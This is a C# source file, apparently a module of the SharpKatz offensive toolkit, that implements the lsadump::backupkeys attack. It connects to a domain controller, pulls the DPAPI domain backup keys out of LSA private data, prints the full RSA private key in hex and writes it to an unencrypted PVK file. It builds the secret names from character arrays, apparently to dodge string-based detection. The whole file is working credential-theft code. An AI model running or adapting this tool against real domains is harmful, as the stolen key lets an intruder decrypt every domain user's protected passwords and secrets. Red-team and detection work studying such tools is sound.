//
// Author: Johto
// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
// License: BSD 3-Clause
// Module: lsadump::backupkeys - Extract DPAPI domain backup keys from DC
//

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using static SharpKatz.Win32.Natives;

namespace SharpKatz.Module
{
    class LsadumpBackupkeys
    {
        // DPAPI backup key secret names
        // G$BCKUPKEY_PREFERRED  = GUID of preferred backup key
        // G$BCKUPKEY_P          = DPAPI backup key (legacy)
        // G$BCKUPKEY_{guid}     = Specific backup key by GUID
        private static readonly string SECRET_PREFERRED = new string(new char[] {
            'G', '$', 'B', 'C', 'K', 'U', 'P', 'K', 'E', 'Y', '_', 'P', 'R', 'E', 'F', 'E', 'R', 'R', 'E', 'D' });
        private static readonly string SECRET_PREFIX = new string(new char[] {
            'G', '$', 'B', 'C', 'K', 'U', 'P', 'K', 'E', 'Y', '_' });
        private static readonly string SECRET_P = new string(new char[] {
            'G', '$', 'B', 'C', 'K', 'U', 'P', 'K', 'E', 'Y', '_', 'P' });

        // PVK file constants
        const uint PVK_MAGIC = 0xb0b5f11e;
        const uint PVK_FILE_VERSION = 0;
        const uint AT_KEYEXCHANGE = 1;

        // DPAPI backup key version (RSA key version 2)
        const uint BACKUPKEY_VERSION_2 = 2;

        /// <summary>
        /// PVK file header for saving backup key
        /// </summary>
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct PVK_FILE_HDR
        {
            public uint dwMagic;       // 0xb0b5f11e
            public uint dwVersion;     // 0
            public uint dwKeySpec;     // AT_KEYEXCHANGE (1)
            public uint dwEncryptType; // 0 (unencrypted)
            public uint cbEncryptData; // salt length (0)
            public uint cbPvk;         // key blob length
        }

        /// <summary>
        /// Entry point for lsadump::backupkeys
        /// Connects to DC via LsaOpenPolicy and retrieves DPAPI backup keys
        /// </summary>
        public static bool ExtractBackupKeys(string dcName, string outputDir, bool exportPvk)
        {
            Console.WriteLine("\n  [*] lsadump::backupkeys");

            if (string.IsNullOrEmpty(dcName))
            {
                Console.WriteLine("   [-] Domain controller name required (--DC parameter)");
                return false;
            }

            // Ensure DC name starts with \\
            if (!dcName.StartsWith("\\\\"))
                dcName = "\\\\" + dcName;

            Console.WriteLine("   [*] Target DC: {0}", dcName);

            // Open LSA policy on DC
            LSA_OBJECT_ATTRIBUTES objAttr = new LSA_OBJECT_ATTRIBUTES();
            objAttr.Length = (uint)Marshal.SizeOf(typeof(LSA_OBJECT_ATTRIBUTES));
            IntPtr policyHandle;

            uint status = LsaOpenPolicy(dcName, ref objAttr, POLICY_GET_PRIVATE_INFORMATION, out policyHandle);
            if (status != 0)
            {
                int winError = LsaNtStatusToWinError(status);
                Console.WriteLine("   [-] LsaOpenPolicy failed: NTSTATUS 0x{0:X8} (Win32 error {1})", status, winError);
                return false;
            }

            Console.WriteLine("   [+] Connected to DC");

            try
            {
                // Step 1: Get preferred backup key GUID
                IntPtr privateData;
                status = LsaRetrievePrivateData(policyHandle, SECRET_PREFERRED, out privateData);
                if (status != 0)
                {
                    int winError = LsaNtStatusToWinError(status);
                    Console.WriteLine("   [-] Cannot retrieve preferred backup key GUID: NTSTATUS 0x{0:X8} (Win32 {1})", status, winError);
                    // Try legacy key
                    return TryLegacyKey(policyHandle, outputDir, exportPvk);
                }

                if (privateData == IntPtr.Zero)
                {
                    Console.WriteLine("   [-] No preferred backup key data returned");
                    return TryLegacyKey(policyHandle, outputDir, exportPvk);
                }

                // Parse LSA_UNICODE_STRING returned by LsaRetrievePrivateData
                LSA_UNICODE_STRING lsaData = (LSA_UNICODE_STRING)Marshal.PtrToStructure(privateData, typeof(LSA_UNICODE_STRING));

                if (lsaData.Length < 16 || lsaData.Buffer == IntPtr.Zero)
                {
                    Console.WriteLine("   [-] Invalid preferred key data");
                    LsaFreeMemory(privateData);
                    return TryLegacyKey(policyHandle, outputDir, exportPvk);
                }

                // The data is a GUID (16 bytes)
                byte[] guidBytes = new byte[16];
                Marshal.Copy(lsaData.Buffer, guidBytes, 0, 16);
                Guid preferredGuid = new Guid(guidBytes);

                Console.WriteLine("   [*] Preferred key GUID: {{{0}}}", preferredGuid.ToString());
                LsaFreeMemory(privateData);

                // Step 2: Retrieve the actual backup key using the GUID
                string secretName = SECRET_PREFIX + preferredGuid.ToString();
                status = LsaRetrievePrivateData(policyHandle, secretName, out privateData);
                if (status != 0)
                {
                    int winError = LsaNtStatusToWinError(status);
                    Console.WriteLine("   [-] Cannot retrieve backup key: NTSTATUS 0x{0:X8} (Win32 {1})", status, winError);
                    // Try with braces
                    secretName = SECRET_PREFIX + "{" + preferredGuid.ToString() + "}";
                    status = LsaRetrievePrivateData(policyHandle, secretName, out privateData);
                    if (status != 0)
                    {
                        Console.WriteLine("   [-] Cannot retrieve backup key (braced): NTSTATUS 0x{0:X8}", status);
                        return TryLegacyKey(policyHandle, outputDir, exportPvk);
                    }
                }

                if (privateData == IntPtr.Zero)
                {
                    Console.WriteLine("   [-] No backup key data returned");
                    return TryLegacyKey(policyHandle, outputDir, exportPvk);
                }

                lsaData = (LSA_UNICODE_STRING)Marshal.PtrToStructure(privateData, typeof(LSA_UNICODE_STRING));
                if (lsaData.Length == 0 || lsaData.Buffer == IntPtr.Zero)
                {
                    Console.WriteLine("   [-] Empty backup key data");
                    LsaFreeMemory(privateData);
                    return TryLegacyKey(policyHandle, outputDir, exportPvk);
                }

                byte[] keyData = new byte[lsaData.Length];
                Marshal.Copy(lsaData.Buffer, keyData, 0, lsaData.Length);
                LsaFreeMemory(privateData);

                Console.WriteLine("   [+] Backup key retrieved ({0} bytes)", keyData.Length);

                // Parse and display the backup key
                bool result = ParseAndSaveBackupKey(keyData, preferredGuid, outputDir, exportPvk);

                // Also try legacy key
                TryLegacyKey(policyHandle, outputDir, exportPvk);

                return result;
            }
            finally
            {
                LsaClose(policyHandle);
            }
        }

        /// <summary>
        /// Try to retrieve the legacy DPAPI backup key (G$BCKUPKEY_P)
        /// </summary>
        private static bool TryLegacyKey(IntPtr policyHandle, string outputDir, bool exportPvk)
        {
            Console.WriteLine("\n   [*] Trying legacy backup key (G$BCKUPKEY_P)...");

            IntPtr privateData;
            uint status = LsaRetrievePrivateData(policyHandle, SECRET_P, out privateData);
            if (status != 0)
            {
                Console.WriteLine("   [-] Legacy key not available");
                return false;
            }

            if (privateData == IntPtr.Zero)
            {
                Console.WriteLine("   [-] No legacy key data");
                return false;
            }

            LSA_UNICODE_STRING lsaData = (LSA_UNICODE_STRING)Marshal.PtrToStructure(privateData, typeof(LSA_UNICODE_STRING));
            if (lsaData.Length == 0 || lsaData.Buffer == IntPtr.Zero)
            {
                LsaFreeMemory(privateData);
                Console.WriteLine("   [-] Empty legacy key data");
                return false;
            }

            byte[] keyData = new byte[lsaData.Length];
            Marshal.Copy(lsaData.Buffer, keyData, 0, lsaData.Length);
            LsaFreeMemory(privateData);

            Console.WriteLine("   [+] Legacy backup key retrieved ({0} bytes)", keyData.Length);

            // Legacy key is a raw key blob that can be used directly
            Console.Write("   [+] Legacy key (hex): ");
            Console.WriteLine(Utility.PrintHashBytes(keyData));

            if (exportPvk && !string.IsNullOrEmpty(outputDir))
            {
                string legacyFile = Path.Combine(outputDir, "legacy_backupkey.bin");
                File.WriteAllBytes(legacyFile, keyData);
                Console.WriteLine("   [+] Legacy key saved to: {0}", legacyFile);
            }

            return true;
        }

        /// <summary>
        /// Parse backup key data and optionally save as PVK file
        /// Backup key v2 structure:
        ///   [version(4)] [unk(4)] [cbPrivateKey(4)] [cbCertificate(4)]
        ///   [privateKey(cbPrivateKey)] [certificate(cbCertificate)]
        /// </summary>
        private static bool ParseAndSaveBackupKey(byte[] keyData, Guid keyGuid, string outputDir, bool exportPvk)
        {
            if (keyData.Length < 16)
            {
                Console.Write("   [+] Raw key (hex): ");
                Console.WriteLine(Utility.PrintHashBytes(keyData));
                return true;
            }

            // Parse version
            uint version = BitConverter.ToUInt32(keyData, 0);

            if (version == BACKUPKEY_VERSION_2)
            {
                // Version 2: contains RSA private key + certificate
                Console.WriteLine("   [*] Backup key version 2 (RSA)");

                if (keyData.Length < 16)
                {
                    Console.WriteLine("   [-] Key data too small");
                    return false;
                }

                uint unk = BitConverter.ToUInt32(keyData, 4);
                uint cbPrivateKey = BitConverter.ToUInt32(keyData, 8);
                uint cbCertificate = BitConverter.ToUInt32(keyData, 12);

                Console.WriteLine("   [*] Private key size: {0}", cbPrivateKey);
                Console.WriteLine("   [*] Certificate size: {0}", cbCertificate);

                if (16 + cbPrivateKey > keyData.Length)
                {
                    Console.WriteLine("   [-] Invalid private key size");
                    return false;
                }

                byte[] privateKeyBlob = new byte[cbPrivateKey];
                Array.Copy(keyData, 16, privateKeyBlob, 0, (int)cbPrivateKey);

                Console.Write("   [+] Private key (first 32 bytes): ");
                byte[] preview = new byte[Math.Min(32, privateKeyBlob.Length)];
                Array.Copy(privateKeyBlob, preview, preview.Length);
                Console.WriteLine(Utility.PrintHashBytes(preview));

                // Extract certificate if present
                if (cbCertificate > 0 && 16 + cbPrivateKey + cbCertificate <= keyData.Length)
                {
                    byte[] certData = new byte[cbCertificate];
                    Array.Copy(keyData, 16 + (int)cbPrivateKey, certData, 0, (int)cbCertificate);
                    Console.WriteLine("   [+] Certificate extracted ({0} bytes)", cbCertificate);

                    if (!string.IsNullOrEmpty(outputDir))
                    {
                        string certFile = Path.Combine(outputDir, string.Format("backupkey_{0}.der", keyGuid.ToString()));
                        File.WriteAllBytes(certFile, certData);
                        Console.WriteLine("   [+] Certificate saved to: {0}", certFile);
                    }
                }

                // Save as PVK file
                if (exportPvk && !string.IsNullOrEmpty(outputDir))
                {
                    string pvkFile = Path.Combine(outputDir, string.Format("backupkey_{0}.pvk", keyGuid.ToString()));
                    SaveAsPvk(privateKeyBlob, pvkFile);
                }

                // Also print the hex of the full private key for use with dpapi::masterkey
                Console.Write("\n   [+] Full private key blob (hex): ");
                Console.WriteLine(Utility.PrintHashBytes(privateKeyBlob));

                return true;
            }
            else
            {
                // Version 1 or raw key
                Console.WriteLine("   [*] Backup key version {0} (raw)", version);
                Console.Write("   [+] Key (hex): ");
                Console.WriteLine(Utility.PrintHashBytes(keyData));

                if (exportPvk && !string.IsNullOrEmpty(outputDir))
                {
                    string rawFile = Path.Combine(outputDir, string.Format("backupkey_{0}.bin", keyGuid.ToString()));
                    File.WriteAllBytes(rawFile, keyData);
                    Console.WriteLine("   [+] Raw key saved to: {0}", rawFile);
                }

                return true;
            }
        }

        /// <summary>
        /// Save RSA private key blob as PVK file
        /// PVK format: magic(4) + version(4) + keyspec(4) + encrypttype(4) + saltlen(4) + keylen(4) + keyblob
        /// </summary>
        private static void SaveAsPvk(byte[] privateKeyBlob, string outputPath)
        {
            try
            {
                PVK_FILE_HDR header = new PVK_FILE_HDR();
                header.dwMagic = PVK_MAGIC;
                header.dwVersion = PVK_FILE_VERSION;
                header.dwKeySpec = AT_KEYEXCHANGE;
                header.dwEncryptType = 0; // unencrypted
                header.cbEncryptData = 0; // no salt
                header.cbPvk = (uint)privateKeyBlob.Length;

                int headerSize = Marshal.SizeOf(typeof(PVK_FILE_HDR));
                byte[] pvkData = new byte[headerSize + privateKeyBlob.Length];

                // Marshal header to bytes
                IntPtr hdrPtr = Marshal.AllocHGlobal(headerSize);
                try
                {
                    Marshal.StructureToPtr(header, hdrPtr, false);
                    Marshal.Copy(hdrPtr, pvkData, 0, headerSize);
                }
                finally
                {
                    Marshal.FreeHGlobal(hdrPtr);
                }

                // Append key blob
                Array.Copy(privateKeyBlob, 0, pvkData, headerSize, privateKeyBlob.Length);

                File.WriteAllBytes(outputPath, pvkData);
                Console.WriteLine("   [+] PVK file saved to: {0}", outputPath);
            }
            catch (Exception ex)
            {
                Console.WriteLine("   [-] Failed to save PVK file: {0}", ex.Message);
            }
        }
    }
}
